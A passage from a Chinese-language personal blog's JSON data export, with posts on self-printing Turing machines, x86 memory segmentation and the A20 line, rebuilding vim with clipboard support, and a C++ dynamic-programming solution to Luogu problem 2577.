那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下w&lt;p&gt;&lt;q&gt;&lt;b&gt; 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。","raw":"---\ntitle: 打印自身的图灵机的构造\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-08-03 11:16:51\ntags:\n- 图灵机\ndescription: 打印自身的图灵机的构造\ncategories:\n- 计算理论\n---\n\n- 以下是*Introduction to The Theory of Computation* 英文第三版的Lemma6.1、Theory6.3的个人理解 \n\n- 下文中，`<p>` 代表图灵机p的编码\n\n\n- 首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台\n- 然后，利用上面这个东西，就可以**特殊构造**某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身\n- 然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是`<p><q>` ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机\n- 继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出`<q><b>` 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了`<p><q><b>` 。当图灵机a、图灵机q运行完之后，纸带上就有了`<p><q><b>` 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出`<p>` 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得`<p><q><b>` ，继续执行计算。\n- 上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。\n- 更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出`<p>` ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与`<p><q>` 无关）。\n- 那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下`w<p><q><b>` 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。\n","content":"<ul>\n<li><p>以下是<em>Introduction to The Theory of Computation</em> 英文第三版的Lemma6.1、Theory6.3的个人理解 </p>\n</li>\n<li><p>下文中，<code>&lt;p&gt;</code> 代表图灵机p的编码</p>\n</li>\n</ul>\n<ul>\n<li>首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台</li>\n<li>然后，利用上面这个东西，就可以<strong>特殊构造</strong>某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身</li>\n<li>然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是<code>&lt;p&gt;&lt;q&gt;</code> ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机</li>\n<li>继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出<code>&lt;q&gt;&lt;b&gt;</code> 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。当图灵机a、图灵机q运行完之后，纸带上就有了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出<code>&lt;p&gt;</code> 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> ，继续执行计算。</li>\n<li>上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。</li>\n<li>更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出<code>&lt;p&gt;</code> ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与<code>&lt;p&gt;&lt;q&gt;</code> 无关）。</li>\n<li>那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下<code>w&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。</li>\n</ul>\n","slug":"打印自身的图灵机的构造","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"图灵机","slug":"图灵机","permalink":"https://h-zex.github.io/tags/图灵机/"}]},{"title":"Segmentation 分段","date":"2018-06-30T05:09:58.000Z","path":"2018/06/30/Segmentation-分段/","text":"以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理 xv6book, PC Assembly Language, CMU-15-410 segment 在分段中，寻址使用的是一个 &lt;selector, offset&gt; 的pair real mode selector 保存在segment register，这是一个paragraph number。 内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address 16-bit protected mode selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。 table selector flag指示的是segment number使用的是GDT还是LDT的index RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级 In this case (the %CS register), the RPL sets the privilege level of the processor 不过，在mit 6.828的那本xv6book的Appendix B中有一幅图 其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点 GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address 32-bit protected mode 80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。 解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是&lt;selector, offset&gt; ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表 题外话 可以使用一些方法使得分段实际上跟没有起作用一样。 比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的 在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用 The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal. 逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。A20 Line wiki If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).","raw":"---\ntitle: Segmentation 分段\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-06-30 13:09:58\ntags:\n- MIT 6.828\n- OS\ndescription: MIT 6.828, CMU 15-410 关于segmentation的资料的整理\ncategories:\n- OS\n---\n\n> 以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理\n>\n> [xv6book](https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf), [PC Assembly Language](https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf), [CMU-15-410 segment ](https://www.cs.cmu.edu/~410/doc/segments/segments.html)\n\n> 在分段中，寻址使用的是一个 `<selector, offset>` 的pair\n\n#### real mode\n\n- selector 保存在segment register，这是一个paragraph number。\n\n- > 内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph\n\n- segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address\n\n#### 16-bit protected mode\n\n- selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 \n  {% asset_img 1.gif %}\n\n  segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。\n\n  table selector flag指示的是segment number使用的是GDT还是LDT的index\n\n  RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级\n\n  >  In this case (the %CS register), the RPL sets the privilege level of the processor\n\n  不过，在mit 6.828的那本xv6book的Appendix B中有一幅图\n\n  {% asset_img 2.png %}\n\n  其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点\n\n- GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset>= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address\n\n#### 32-bit protected mode\n\n- 80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。\n\n- 解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是`<selector, offset>` ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表\n\n  {% asset_img 3.png %}\n\n#### 题外话\n\n- 可以使用一些方法使得分段实际上跟没有起作用一样。\n\n- 比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的\n\n- 在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用\n\n  > The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.\n\n- 逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。[A20 Line wiki](https://wiki.osdev.org/A20_Line)\n   > If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60 \n   > The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel's 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren't quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.\n   > When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).\n\n","content":"<blockquote>\n<p>以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理</p>\n<p><a href=\"https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf\" target=\"_blank\" rel=\"noopener\">xv6book</a>, <a href=\"https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf\" target=\"_blank\" rel=\"noopener\">PC Assembly Language</a>, <a href=\"https://www.cs.cmu.edu/~410/doc/segments/segments.html\" target=\"_blank\" rel=\"noopener\">CMU-15-410 segment </a></p>\n</blockquote>\n<blockquote>\n<p>在分段中，寻址使用的是一个 <code>&lt;selector, offset&gt;</code> 的pair</p>\n</blockquote>\n<h4 id=\"real-mode\"><a href=\"#real-mode\" class=\"headerlink\" title=\"real mode\"></a>real mode</h4><ul>\n<li><p>selector 保存在segment register，这是一个paragraph number。</p>\n</li>\n<li><blockquote>\n<p>内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph</p>\n</blockquote>\n</li>\n<li><p>segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address</p>\n</li>\n</ul>\n<h4 id=\"16-bit-protected-mode\"><a href=\"#16-bit-protected-mode\" class=\"headerlink\" title=\"16-bit protected mode\"></a>16-bit protected mode</h4><ul>\n<li><p>selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 </p>\n<img src=\"/2018/06/30/Segmentation-分段/1.gif\">\n<p>segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。</p>\n<p>table selector flag指示的是segment number使用的是GDT还是LDT的index</p>\n<p>RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级</p>\n<blockquote>\n<p> In this case (the %CS register), the RPL sets the privilege level of the processor</p>\n</blockquote>\n<p>不过，在mit 6.828的那本xv6book的Appendix B中有一幅图</p>\n<img src=\"/2018/06/30/Segmentation-分段/2.png\">\n<p>其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点</p>\n</li>\n<li><p>GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address</p>\n</li>\n</ul>\n<h4 id=\"32-bit-protected-mode\"><a href=\"#32-bit-protected-mode\" class=\"headerlink\" title=\"32-bit protected mode\"></a>32-bit protected mode</h4><ul>\n<li><p>80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。</p>\n</li>\n<li><p>解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是<code>&lt;selector, offset&gt;</code> ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表</p>\n<img src=\"/2018/06/30/Segmentation-分段/3.png\">\n</li>\n</ul>\n<h4 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h4><ul>\n<li><p>可以使用一些方法使得分段实际上跟没有起作用一样。</p>\n</li>\n<li><p>比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的</p>\n</li>\n<li><p>在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用</p>\n<blockquote>\n<p>The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.</p>\n</blockquote>\n</li>\n<li><p>逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。<a href=\"https://wiki.osdev.org/A20_Line\" target=\"_blank\" rel=\"noopener\">A20 Line wiki</a></p>\n<blockquote>\n<p>If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60<br>The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.<br>When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).</p>\n</blockquote>\n</li>\n</ul>\n","slug":"Segmentation-分段","categories":[{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/categories/OS/"}],"tags":[{"name":"MIT 6.828","slug":"MIT-6-828","permalink":"https://h-zex.github.io/tags/MIT-6-828/"},{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/tags/OS/"}]},{"title":"vim 不支持系统剪切板的解决方案","date":"2018-06-05T07:15:31.000Z","path":"2018/06/05/vim不支持系统剪切板的解决方案/","text":"判断vim是否支持系统剪切板 在终端输入vim -version，如果clipboard 那一项是-clipboard ，以及xterm_clipboard 那一项是-xterm_clipboard ，说明并不支持。可以通过重新编译来解决 以下引用另一位博主的解决方案，原文地址 +clipboard +xterm_clipboard solution: –with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11 You’ll need to install the appropriate X development library like xlib and xtst for --with-x to work. On ubuntu it should be enough to install libx11-dev and libxtst-dev., xlibs-dev and sudo apt-get build-dep vim-gtk 编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行 123456789101112./configure \\--enable-cscope \\--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\--with-features=normal \\--enable-multibyte \\--enable-rubyinterp \\--enable-pythoninterp \\--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\--enable-perlinterp \\--enable-luainterp \\--enable-gui=gtk2 --enable-cscope --prefix=/usr make &amp;&amp; sudo make install 上面的配置选项可以根据自己的需求修改 完成后可以在src/auto/config.log 查看log","raw":"---\ntitle: vim 不支持系统剪切板的解决方案\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-06-05 15:15:31\ntags:\n- vim\n- 系统剪切板\n- clipboard\n- xterm_clipboard\ndescription: vim 不支持系统剪切板的解决方案\ncategories:\n- 运维\n---\n\n### 判断vim是否支持系统剪切板\n\n- 在终端输入`vim -version`，如果`clipboard` 那一项是`-clipboard` ，以及`xterm_clipboard` 那一项是`-xterm_clipboard` ，说明并不支持。可以通过重新编译来解决\n\n- 以下引用另一位博主的解决方案，[原文地址](https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae)\n\n- > +clipboard +xterm_clipboard\n  >\n  > solution:\n  >\n  > --with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11\n  >\n  > You'll need to install the appropriate X development library like `xlib` and `xtst` for `--with-x` to work. On ubuntu it should be enough to install `libx11-dev` and `libxtst-dev`., xlibs-dev\n  >\n  > and   sudo apt-get build-dep vim-gtk \n\n- 编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行\n\n  ```\n  ./configure \\\n  --enable-cscope \\\n  --with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\\n  --with-features=normal \\\n  --enable-multibyte \\\n  --enable-rubyinterp \\\n  --enable-pythoninterp \\\n  --with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\\n  --enable-perlinterp \\\n  --enable-luainterp \\\n  --enable-gui=gtk2 --enable-cscope --prefix=/usr\n   make && sudo make install\n  ```\n\n  上面的配置选项可以根据自己的需求修改\n\n  完成后可以在`src/auto/config.log` 查看log","content":"<h3 id=\"判断vim是否支持系统剪切板\"><a href=\"#判断vim是否支持系统剪切板\" class=\"headerlink\" title=\"判断vim是否支持系统剪切板\"></a>判断vim是否支持系统剪切板</h3><ul>\n<li><p>在终端输入<code>vim -version</code>，如果<code>clipboard</code> 那一项是<code>-clipboard</code> ，以及<code>xterm_clipboard</code> 那一项是<code>-xterm_clipboard</code> ，说明并不支持。可以通过重新编译来解决</p>\n</li>\n<li><p>以下引用另一位博主的解决方案，<a href=\"https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae\" target=\"_blank\" rel=\"noopener\">原文地址</a></p>\n</li>\n<li><blockquote>\n<p>+clipboard +xterm_clipboard</p>\n<p>solution:</p>\n<p>–with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11</p>\n<p>You’ll need to install the appropriate X development library like <code>xlib</code> and <code>xtst</code> for <code>--with-x</code> to work. On ubuntu it should be enough to install <code>libx11-dev</code> and <code>libxtst-dev</code>., xlibs-dev</p>\n<p>and   sudo apt-get build-dep vim-gtk </p>\n</blockquote>\n</li>\n<li><p>编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure \\</span><br><span class=\"line\">--enable-cscope \\</span><br><span class=\"line\">--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\</span><br><span class=\"line\">--with-features=normal \\</span><br><span class=\"line\">--enable-multibyte \\</span><br><span class=\"line\">--enable-rubyinterp \\</span><br><span class=\"line\">--enable-pythoninterp \\</span><br><span class=\"line\">--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\</span><br><span class=\"line\">--enable-perlinterp \\</span><br><span class=\"line\">--enable-luainterp \\</span><br><span class=\"line\">--enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class=\"line\"> make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>\n<p>上面的配置选项可以根据自己的需求修改</p>\n<p>完成后可以在<code>src/auto/config.log</code> 查看log</p>\n</li>\n</ul>\n","slug":"vim不支持系统剪切板的解决方案","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://h-zex.github.io/tags/vim/"},{"name":"系统剪切板","slug":"系统剪切板","permalink":"https://h-zex.github.io/tags/系统剪切板/"},{"name":"clipboard","slug":"clipboard","permalink":"https://h-zex.github.io/tags/clipboard/"},{"name":"xterm_clipboard","slug":"xterm-clipboard","permalink":"https://h-zex.github.io/tags/xterm-clipboard/"}]},{"title":"洛谷2577 午餐","date":"2018-05-20T00:20:06.000Z","path":"2018/05/20/洛谷2577-午餐/","text":"题目题目描述上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。 THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。 现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。 假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。 现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。 输入输出格式输入格式： 第一行一个整数N，代表总共有N个人。 以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。 输出格式： 一个整数T，代表所有人吃完饭的最早时刻。 输入输出样例输入样例#1： 12345652 27 71 36 48 5 输出样例#1： 117 题解吃饭时间越长越早排队 假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，i、j ——即原先是i 排在j 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来 首先，交换前从队头到到j 总的打饭时间或者是交换后从队头到i 的总的打饭时间都是$T$ 然后以前$T$时间后，j 开始吃饭，现在是$T$时间后，i 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是j 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ 如何记录状态以及状态转移方程 $dp[i][j][k]$ ：表示当排到第i 个人时，第一队的排队耗时是j ，第二队的排队耗时是k 先定义符号，$man[i].a$ 表示第i 人的打饭时间，$man[i].b$ 是第i 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$ 因为，对于确定的i ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ 123int x = MAX(dp[i-1][j-man[i].a][k], j+man[i].b);int y = MAX(dp[i-1][j][k-man[i].a], k+man[i].b);dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y); 之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX 因为无需枚举k ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define FWD(x, b, e) for (int x = b; x &lt; e; x++)#define BWD(x, b, e) for (int x = b; x &gt;= e; x--)#define INF 0x3f3f3f3fusing namespace std;inline int MAX(int x, int y) &#123; return x &lt; y ? y : x; &#125;inline int MIN(int x, int y) &#123; return x &lt; y ? x : y; &#125;struct Node &#123; int a, b;// a is pick time, b is eat time bool operator&lt;(const Node &amp;y) const &#123; return this-&gt;b &gt; y.b; &#125;&#125;;Node man[300];int dp[80010];int sum[300];int main() &#123; int n; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d%d\", &amp;man[i].a, &amp;man[i].b); &#125; sort(man, man + n); sum[0] = man[0].a; FWD(i, 1, n) &#123; sum[i] = sum[i - 1] + man[i].a; &#125; memset(dp, 10, sizeof(dp)); dp[0] = man[0].b + man[0].a; dp[man[0].a] = man[0].b + man[0].a; FWD(i, 1, n) &#123; BWD(j, sum[i], 0) &#123; int tmp1 = INF, tmp2 = INF; if (j &gt;= man[i].a) &#123; tmp1 = MAX(dp[j - man[i].a], j + man[i].b);// 第一个人放在1队 &#125; if (sum[i] - j &gt;= man[i].a) &#123; tmp2 = MAX(dp[j], sum[i] - j + man[i].b);// 第i个人放在二队 &#125; // 如果j只能允许man[i].a放在一队，则i就放一队 if (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123; dp[j] = tmp1; &#125;else if (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123; dp[j] = tmp2; &#125;else if (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123; dp[j] = MIN(tmp2, tmp1); &#125; &#125; &#125; int ans = INF; FWD(i, 0, sum[n - 1] + 1) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125; printf(\"%d\\n\", ans);&#125; 注意，在枚举$dp[i][j]$ 的j 时，要注意该j 是否允许man[i].a 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN 注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。 此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归 截图来源","raw":"---\ntitle: 洛谷2577 午餐\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-20 08:20:06\ntags: \n- 动态规划\n- ACM\ndescription: 题解\ncategories:\n- 算法\n---\n\n## 题目\n\n#### 题目描述\n\n上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。\n\nTHU 